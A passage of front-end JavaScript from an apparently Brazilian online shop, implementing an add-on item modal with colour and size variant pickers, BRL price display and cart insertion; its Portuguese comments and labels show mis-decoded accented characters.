                <span id="ob-tam-label" class="text-slate-800">Selecione o tamanho‚Ä¶</span>
              </button>
              <div id="ob-tam-dropdown" class="absolute z-50 mt-2 w-full bg-white border border-slate-200 rounded-md shadow-lg max-h-64 overflow-auto hidden">
                <ul id="ob-tam-list" class="divide-y divide-slate-100"></ul>
              </div>
            </div>
          </div>
        </div>
        <div class="flex justify-end gap-2">
          <button type="button" class="px-4 py-2 rounded-md border" id="ob-cancel">Cancelar</button>
          <button type="button" class="px-4 py-2 rounded-md bg-[#00d8d1] hover:bg-[#00c2bd] text-white font-semibold disabled:opacity-60" id="ob-confirm">Quero esse item</button>
        </div>
      `;

      overlay.appendChild(modal);
      document.body.appendChild(overlay);

  const headerThumb = modal.querySelector('#ob-header-thumb');
  const priceEl = modal.querySelector('#ob-price');
  const priceCmpEl = modal.querySelector('#ob-price-cmp');
  const confirmBtn = modal.querySelector('#ob-confirm');

  let selectedVar = null; // variante final escolhida
  let uiSelectedColor = null; // r√≥tulo de cor escolhido (para exibi√ß√£o)
  let uiSelectedSize = null;  // r√≥tulo de tamanho escolhido (para exibi√ß√£o)
  let selectedColorImageRel = null; // imagem resolvida para a cor escolhida (relativa ou absoluta)

      function applySelectedVariant(v) {
        selectedVar = v ? {
          id: v.id ?? null,
          preco: toNumber(v.preco ?? ob.preco),
          precoCmp: toNumber(v.preco_comparacao ?? v.precoComparacao ?? 0),
          titulo: v.titulo || '',
          imagem: getVariantImage(v) || (Array.isArray(ob.fotos) && ob.fotos.length ? ob.fotos[0] : '')
        } : null;
        if (selectedVar) {
          const img = resolveMedia(selectedVar.imagem);
          if (headerThumb) headerThumb.src = img;
          if (priceEl) priceEl.textContent = formatBRL(selectedVar.preco);
          if (priceCmpEl) {
            if (selectedVar.precoCmp && selectedVar.precoCmp > selectedVar.preco) {
              priceCmpEl.textContent = formatBRL(selectedVar.precoCmp);
              priceCmpEl.classList.remove('hidden');
            } else {
              priceCmpEl.textContent = '';
              priceCmpEl.classList.add('hidden');
            }
          }
        }
        updateConfirmState();
      }

      function updateConfirmState() {
        // Regras: se existir dimens√£o de Cor (has2D ou hasColorNow), exigir selectedVar
        // Se for somente tamanho (sem cor), tamb√©m exigir selectedVar
        const needSelection = (typeof has2D !== 'undefined' && has2D) || (typeof hasColorNow !== 'undefined' && hasColorNow) || (typeof hasSizeNow !== 'undefined' && hasSizeNow);
        if (confirmBtn) {
          confirmBtn.disabled = needSelection && !selectedVar;
        }
      }

      function formatCorTamanhoLabel(cor, tamanho, fallbackTitulo) {
        let c = cor || null;
        let t = tamanho || null;
        if (!c || !t) {
          const parsed = parseColorSizeFromTitle(fallbackTitulo || '');
          c = c || parsed.cor;
          t = t || parsed.tamanho;
        }
        const label = [c, t].filter(Boolean).join(' ‚Äî ');
        return label || (fallbackTitulo || 'Op√ß√£o');
      }

      // Refer√™ncias dos pickers (sempre existem agora)
      const corPicker = modal.querySelector('#ob-cor-picker');
      const corDropdown = modal.querySelector('#ob-cor-dropdown');
      const corList = modal.querySelector('#ob-cor-list');
      const corLabel = modal.querySelector('#ob-cor-label');
      const corThumb = modal.querySelector('#ob-cor-thumb');

      const tamPicker = modal.querySelector('#ob-tam-picker');
      const tamDropdown = modal.querySelector('#ob-tam-dropdown');
      const tamList = modal.querySelector('#ob-tam-list');
      const tamLabel = modal.querySelector('#ob-tam-label');

  const hasColor = cores.length > 0;
  const hasSize = tamanhos.length > 0;

      // Mapeamentos auxiliares para modos parciais
      const colorToVariant = new Map();
      const sizeToVariant = new Map();
  if (has2D) {
        for (const c of cores) {
          const rep = combos.find(x => x.cor === c)?.v;
          if (rep) colorToVariant.set(c, rep);
        }
        for (const t of tamanhos) {
          const rep = combos.find(x => x.tamanho === t)?.v;
          if (rep) sizeToVariant.set(t, rep);
        }
      } else {
        // Preenche a partir das varia√ß√µes reconhecidas
        for (const v of variacoesOrig) {
          const titulo = v.titulo || v.info || '';
          let { cor, tamanho } = parseColorSizeFromTitle(titulo);
          // tenta tamb√©m nos objetos/arrays
          if (!cor || !tamanho) {
            const attrsObjList = [v.atributos, v.attributes, v.attr, v.opcoes, v.options, v.especificacoes];
            for (const maybe of attrsObjList) {
              if (!cor && maybe && !Array.isArray(maybe) && typeof maybe === 'object') {
                cor = cor || getFromObjKeys(maybe, ['cor', 'Cor', 'color', 'Color']);
              }
              if (!tamanho && maybe && !Array.isArray(maybe) && typeof maybe === 'object') {
                tamanho = tamanho || getFromObjKeys(maybe, ['tamanho', 'Tamanho', 'tam', 'Tam', 'size', 'Size']);
              }
            }
          }
          // evita cadastrar tokens de tamanho como cor
          if (cor && !sizeRegex.test(String(cor)) && !colorToVariant.has(cor)) colorToVariant.set(cor, v);
          if (tamanho && !sizeToVariant.has(tamanho)) sizeToVariant.set(tamanho, v);
        }
      }

      if (has2D) {
        // Helpers 2D
  let selectedCor = null;
  let selectedTam = null;

        function getVariant(cor, tamanho) {
          const found = combos.find(c => c.cor === cor && c.tamanho === tamanho);
          return found ? found.v : null;
        }

        function renderCorList() {
          corList.innerHTML = cores.map(c => {
            const rep = combos.find(x => x.cor === c)?.v;
            const imgRel = findImageForColor(c, rep);
            const img = resolveMedia(imgRel || (Array.isArray(ob.fotos) && ob.fotos.length ? ob.fotos[0] : ''));
            return `
              <li class="ob-cor-item flex items-center gap-3 p-2 cursor-pointer hover:bg-slate-50" data-cor="${c.replace(/"/g,'&quot;')}">
                <img src="${img}" class="w-8 h-8 object-cover rounded border" alt="${c.replace(/"/g,'&quot;')}">
                <span class="text-sm text-slate-800">${c}</span>
              </li>`;
          }).join('');
        }

        function renderTamList() {
          if (!selectedCor) { tamList.innerHTML = ''; return; }
          const disponiveis = combos.filter(x => x.cor === selectedCor).map(x => x.tamanho);
          // Ordena tamanhos por uma ordem comum
          const order = ['PP','P','M','G','GG','XG','XS','S','L','XL','XXL','2XL','3XL','4XL','5XL'];
          const sorted = Array.from(new Set(disponiveis)).sort((a,b)=>{
            const ia = order.indexOf(a.toUpperCase());
            const ib = order.indexOf(b.toUpperCase());
            if (ia !== -1 && ib !== -1) return ia - ib;
            if (ia !== -1) return -1;
            if (ib !== -1) return 1;
            return a.localeCompare(b, 'pt-BR');
          });
          tamList.innerHTML = sorted.map(t => `
            <li class="ob-tam-item p-2 cursor-pointer hover:bg-slate-50" data-tam="${t.replace(/"/g,'&quot;')}">
              <span class="text-sm text-slate-800">${t}</span>
            </li>
          `).join('');
        }

        function setCor(c) {
          selectedCor = c;
          uiSelectedColor = c;
          const rep = combos.find(x => x.cor === c)?.v;
          const imgRel = findImageForColor(c, rep);
          selectedColorImageRel = imgRel || (rep && getVariantImage(rep)) || '';
          const img = resolveMedia(imgRel || (rep && rep.imagem) || (Array.isArray(ob.fotos) && ob.fotos.length ? ob.fotos[0] : ''));
          if (corLabel) corLabel.textContent = c;
          if (corThumb) { corThumb.src = img; corThumb.classList.remove('hidden'); }
          if (headerThumb) headerThumb.src = img;
          // Aplica variante com base apenas na cor (primeira combina√ß√£o encontrada)
          if (rep) {
            const rep2 = { ...rep, imagem: imgRel || getVariantImage(rep) };
            applySelectedVariant(rep2);
          }
          renderTamList();
          // Define label padr√£o do tamanho sem alterar a variante
          const first = tamList.querySelector('li.ob-tam-item');
          if (first) {
            selectedTam = first.getAttribute('data-tam');
            uiSelectedSize = selectedTam;
            tamLabel.textContent = selectedTam;
            tamPicker.disabled = false;
          } else {
            selectedTam = null;
            uiSelectedSize = null;
            tamLabel.textContent = 'Indispon√≠vel';
            tamPicker.disabled = true;
          }
        }

        function setTam(t) {
          selectedTam = t;
          uiSelectedSize = t;
          if (tamLabel) tamLabel.textContent = t;
          tamPicker.disabled = false;
          // N√ÉO altera a variante; apenas atualiza r√≥tulo de tamanho
        }

        // Wire Cor picker
        corPicker.addEventListener('click', () => {
          renderCorList();
          corDropdown.classList.toggle('hidden');
        });
        corList.addEventListener('click', (ev) => {
          const li = ev.target.closest('li.ob-cor-item');
          if (!li) return;
          corDropdown.classList.add('hidden');
          setCor(li.getAttribute('data-cor'));
        });

        // Wire Tam picker
        tamPicker.addEventListener('click', () => {
          if (tamPicker.disabled) return;
          tamDropdown.classList.toggle('hidden');
        });
        tamList.addEventListener('click', (ev) => {
          const li = ev.target.closest('li.ob-tam-item');
          if (!li) return;
          tamDropdown.classList.add('hidden');
          setTam(li.getAttribute('data-tam'));
        });

        // Fecha dropdowns ao clicar fora
        document.addEventListener('click', (e) => {
          if (!corDropdown.classList.contains('hidden') && !e.target.closest('#ob-cor-dropdown') && !e.target.closest('#ob-cor-picker')) {
            corDropdown.classList.add('hidden');
          }
          if (!tamDropdown.classList.contains('hidden') && !e.target.closest('#ob-tam-dropdown') && !e.target.closest('#ob-tam-picker')) {
            tamDropdown.classList.add('hidden');
          }
        }, { once: true });

        // Sele√ß√£o inicial: N√ÉO pr√©-seleciona a primeira cor
        renderCorList();
        tamPicker.disabled = true;
        tamLabel.textContent = 'Selecione o tamanho‚Ä¶';
        applySelectedVariant(null);
      } else {
        // Modos parciais: color-only, size-only ou single
        let selectedCor = null;
        let selectedTam = null;

        // Mapeia cores/tamanhos mesmo quando os sets iniciais est√£o vazios (prioriza campo tipo)
        for (const v of variacoesOrig) {
          const titulo = v.titulo || v.info || '';
          let { cor, tamanho } = parseColorSizeFromTitle(titulo);
          const tipo = (v.tipo || '').toString().toLowerCase();
          if (tipo === 'cor' && !cor) cor = clean(titulo);
          if ((tipo === 'tamanho' || tipo === 'tam') && !tamanho) tamanho = clean(titulo);
          if (!cor) cor = deriveColorFromTitle(titulo);
          // tenta tamb√©m nos objetos/arrays
          if (!cor || !tamanho) {
            const attrsObjList = [v.atributos, v.attributes, v.attr, v.opcoes, v.options, v.especificacoes];
            for (const maybe of attrsObjList) {
              if (!cor && maybe && !Array.isArray(maybe) && typeof maybe === 'object') {
                cor = cor || getFromObjKeys(maybe, ['cor', 'Cor', 'color', 'Color']);
              }
              if (!tamanho && maybe && !Array.isArray(maybe) && typeof maybe === 'object') {
                tamanho = tamanho || getFromObjKeys(maybe, ['tamanho', 'Tamanho', 'tam', 'Tam', 'size', 'Size']);
              }
            }
          }
          if (cor && !colorToVariant.has(cor)) colorToVariant.set(cor, v);
          if (tamanho && !sizeToVariant.has(tamanho)) sizeToVariant.set(tamanho, v);
        }

        let hasColorNow = hasColor || colorToVariant.size > 0;
        let hasSizeNow = hasSize || sizeToVariant.size > 0;

        function renderCorListPartial() {
          if (!hasColorNow) {
            // Cor √∫nica
            corPicker.disabled = true;
            corLabel.textContent = 'Cor √∫nica';
            return;
          }
          const items = (cores.length ? Array.from(cores) : Array.from(colorToVariant.keys()))
            .filter(c => !sizeRegex.test(String(c || '')));
          corList.innerHTML = items.map(c => {
            const rep = colorToVariant.get(c) || variacoesOrig.find(v => (parseColorSizeFromTitle(v.titulo||'').cor||'') === c);
            const imgRel = findImageForColor(c, rep);
            const img = resolveMedia(imgRel || (Array.isArray(ob.fotos) && ob.fotos.length ? ob.fotos[0] : ''));
            return `
              <li class="ob-cor-item flex items-center gap-3 p-2 cursor-pointer hover:bg-slate-50" data-cor="${c.replace(/"/g,'&quot;')}">
                <img src="${img}" class="w-8 h-8 object-cover rounded border" alt="${c.replace(/"/g,'&quot;')}">
                <span class="text-sm text-slate-800">${c}</span>
              </li>`;
          }).join('');
        }

        function renderTamListPartial() {
          if (!hasSizeNow) {
            tamPicker.disabled = true;
            tamLabel.textContent = 'Tamanho √∫nico';
            tamList.innerHTML = '';
            return;
          }
          let disponiveis;
          if (hasColorNow && selectedCor) {
            // se reconhecemos cor, filtra tamanhos dessa cor se combos existirem
            if (combos.length) {
              disponiveis = combos.filter(x => x.cor === selectedCor).map(x => x.tamanho);
            } else {
              // sem combos, lista todos tamanhos conhecidos
              disponiveis = tamanhos.length ? tamanhos : Array.from(sizeToVariant.keys());
            }
          } else {
            disponiveis = tamanhos.length ? tamanhos : Array.from(sizeToVariant.keys());
          }
          const order = ['PP','P','M','G','GG','XG','XS','S','L','XL','XXL','2XL','3XL','4XL','5XL'];
          const sorted = Array.from(new Set(disponiveis)).sort((a,b)=>{
            const ia = order.indexOf((a||'').toUpperCase());
            const ib = order.indexOf((b||'').toUpperCase());
            if (ia !== -1 && ib !== -1) return ia - ib;
            if (ia !== -1) return -1;
            if (ib !== -1) return 1;
            return String(a||'').localeCompare(String(b||''), 'pt-BR');
          });
          tamList.innerHTML = sorted.map(t => `
            <li class="ob-tam-item p-2 cursor-pointer hover:bg-slate-50" data-tam="${String(t||'').replace(/"/g,'&quot;')}">
              <span class="text-sm text-slate-800">${t || '√önico'}</span>
            </li>
          `).join('');
          tamPicker.disabled = !sorted.length;
          if (!sorted.length) tamLabel.textContent = 'Tamanho √∫nico';
        }

        function setCorPartial(c) {
          selectedCor = c;
          uiSelectedColor = c;
          const rep = colorToVariant.get(c) || variacoesOrig.find(v => (parseColorSizeFromTitle(v.titulo||'').cor||'') === c);
          const imgRel = findImageForColor(c, rep);
          selectedColorImageRel = imgRel || (rep && getVariantImage(rep)) || '';
          const img = resolveMedia(imgRel || (rep && rep.imagem) || (Array.isArray(ob.fotos) && ob.fotos.length ? ob.fotos[0] : ''));
          if (corLabel) corLabel.textContent = c;
          if (corThumb) { corThumb.src = img; corThumb.classList.remove('hidden'); }
          if (headerThumb) headerThumb.src = img;
          // Cor manda: aplica a variante da cor mesmo que existam tamanhos (tamanho √© apenas r√≥tulo)
          if (rep) {
            const rep2 = { ...rep, imagem: imgRel || getVariantImage(rep) };
            applySelectedVariant(rep2);
          }
          renderTamListPartial();
          const first = tamList.querySelector('li.ob-tam-item');
          if (hasSize && first) {
            selectedTam = first.getAttribute('data-tam');
            uiSelectedSize = selectedTam;
            tamLabel.textContent = selectedTam;
          }
        }

        function setTamPartial(t) {
          selectedTam = t;
          uiSelectedSize = t;
          if (tamLabel) tamLabel.textContent = t || '√önico';
          // Se houver cor dispon√≠vel, tamanho √© est√°tico e n√£o altera a variante
          if (!hasColorNow && hasSizeNow) {
            // Cen√°rio somente tamanho (sem cor): aqui sim escolhe pela varia√ß√£o de tamanho
            let v = sizeToVariant.get(t) || variacoesOrig.find(x => (parseColorSizeFromTitle(x.titulo||'').tamanho||'') === t) || null;
            if (!v) v = variacoesOrig[0] || null;
            // For√ßa imagem do produto principal quando n√£o existe cor
            const prodMain = (Array.isArray(ob.fotos) && ob.fotos.length ? ob.fotos[0] : getVariantImage(v));
            if (headerThumb) headerThumb.src = resolveMedia(prodMain || '');
            selectedColorImageRel = '';
            const v2 = { ...v, imagem: prodMain || getVariantImage(v) };
            applySelectedVariant(v2);
          }
        }

        // Wire Cor picker
        corPicker.addEventListener('click', () => {
          if (corPicker.disabled) return;
          renderCorListPartial();
          corDropdown.classList.toggle('hidden');
        });
        corList.addEventListener('click', (ev) => {
          const li = ev.target.closest('li.ob-cor-item');
          if (!li) return;
          corDropdown.classList.add('hidden');
          setCorPartial(li.getAttribute('data-cor'));
        });

        // Wire Tam picker
        tamPicker.addEventListener('click', () => {
          if (tamPicker.disabled) return;
          tamDropdown.classList.toggle('hidden');
        });
        tamList.addEventListener('click', (ev) => {
          const li = ev.target.closest('li.ob-tam-item');
          if (!li) return;
          tamDropdown.classList.add('hidden');
          setTamPartial(li.getAttribute('data-tam'));
        });

        // Fecha dropdowns ao clicar fora
        document.addEventListener('click', (e) => {
          if (!corDropdown.classList.contains('hidden') && !e.target.closest('#ob-cor-dropdown') && !e.target.closest('#ob-cor-picker')) {
            corDropdown.classList.add('hidden');
          }
          if (!tamDropdown.classList.contains('hidden') && !e.target.closest('#ob-tam-dropdown') && !e.target.closest('#ob-tam-picker')) {
            tamDropdown.classList.add('hidden');
          }
        }, { once: true });

        // Estado inicial
        if (!hasColorNow && !hasSizeNow) {
          // Nenhuma dimens√£o detectada: trata cada varia√ß√£o como "cor" e tamanho √∫nico
          const pseudoCores = variacoesOrig.map(v => (v.titulo || 'Op√ß√£o'));
          cores.length = 0; cores.push(...pseudoCores);
          corPicker.disabled = false;
          renderCorListPartial();
          const first = corList.querySelector('li.ob-cor-item');
          if (first) {
            // usa √≠ndice para recuperar a varia√ß√£o
            const idx = Array.from(corList.children).indexOf(first);
            const v = variacoesOrig[idx] || variacoesOrig[0];
            corLabel.textContent = v.titulo || 'Op√ß√£o';
            const img = resolveMedia(v.imagem || (Array.isArray(ob.fotos) && ob.fotos.length ? ob.fotos[0] : ''));
            corThumb.src = img; corThumb.classList.remove('hidden');
            tamPicker.disabled = true; tamLabel.textContent = 'Tamanho √∫nico';
            applySelectedVariant(v);
          }
        } else if (hasColorNow && !hasSizeNow) {
          // N√ÉO pr√©-seleciona cor
          renderCorListPartial();
          tamPicker.disabled = true; tamLabel.textContent = 'Tamanho √∫nico';
          applySelectedVariant(null);
        } else if (!hasColorNow && hasSizeNow) {
          // Cor √∫nica; lista tamanhos
          corPicker.disabled = true; corLabel.textContent = 'Cor √∫nica';
          renderTamListPartial();
          const firstTam = tamList.querySelector('li.ob-tam-item');
          if (firstTam) setTamPartial(firstTam.getAttribute('data-tam'));
          updateConfirmState();
        } else {
          // Teoricamente n√£o cai aqui (coberto por has2D), mas mant√©m fallback
          renderCorListPartial();
          // N√ÉO pr√©-seleciona cor
          applySelectedVariant(null);
        }
        updateConfirmState();
      }

      // Bot√µes
      modal.querySelector('#ob-cancel').onclick = () => overlay.remove();
      modal.querySelector('#ob-confirm').onclick = () => {
        // Bloqueia se a sele√ß√£o for necess√°ria e ainda n√£o houver variante escolhida
        const needSelection = (typeof has2D !== 'undefined' && has2D) || (typeof hasColorNow !== 'undefined' && hasColorNow) || (typeof hasSizeNow !== 'undefined' && hasSizeNow);
        if (needSelection && !selectedVar) {
          showToast('Selecione a cor para continuar');
          return;
        }
        const v = selectedVar || { id: null, preco: toNumber(ob.preco), precoCmp: toNumber(ob.preco_comparacao ?? ob.precoComparacao ?? 0), titulo: '', imagem: (Array.isArray(ob.fotos) && ob.fotos.length ? ob.fotos[0] : '') };
        const preco = toNumber(v.preco);
        const precoCmp = toNumber(v.precoCmp);
        const tituloVar = v.titulo || '';
        const displayVar = formatCorTamanhoLabel(uiSelectedColor, uiSelectedSize, tituloVar);
        // Imagem no carrinho: se n√£o existe cor (apenas tamanho), usa a principal do produto; sen√£o, imagem da cor
        const noColorHasSize = (typeof hasColorNow !== 'undefined' && !hasColorNow) && (typeof hasSizeNow !== 'undefined' && hasSizeNow);
        const imgRelChosen = noColorHasSize
          ? (Array.isArray(ob.fotos) && ob.fotos.length ? ob.fotos[0] : '')
          : (selectedColorImageRel || (uiSelectedColor ? findImageForColor(uiSelectedColor, v) : getVariantImage(v)));
        const imagem = imgRelChosen || getVariantImage(v) || (Array.isArray(ob.fotos) && ob.fotos.length ? ob.fotos[0] : '');
  const fullSlug = ob.full_slug || ob.slug_path || ob.slug || ob.path || '';

        const variacaoId = v.id || null;
        const jaExiste = state.carrinho.some(i => String(i.produtoId) === String(ob.id));
        if (!jaExiste) {
          const item = normalizarItemCarrinho({
            produtoId: ob.id,
            titulo: ob.titulo || 'Produto',
            preco: preco,
            precoComparacao: precoCmp || preco,
            preco_comparacao: precoCmp || preco,
            desconto: 0,
            variacao: displayVar,
            variacaoId: variacaoId,
            imagem: imagem,
            full_slug: fullSlug,
            quantidade: 1,
          });
          state.carrinho.push(item);
          persistCarrinho();
          renderCarrinho();
          showToast('Item adicional adicionado ao carrinho');
          // Marca o card como resgatado
          markOrderBumpRedeemed(ob.id);
        } else {
          showToast('Esse item j√° est√° no carrinho');
          markOrderBumpRedeemed(ob.id);
        }
        overlay.remove();
      };
    }
  </script>
</body>

</html>
</html>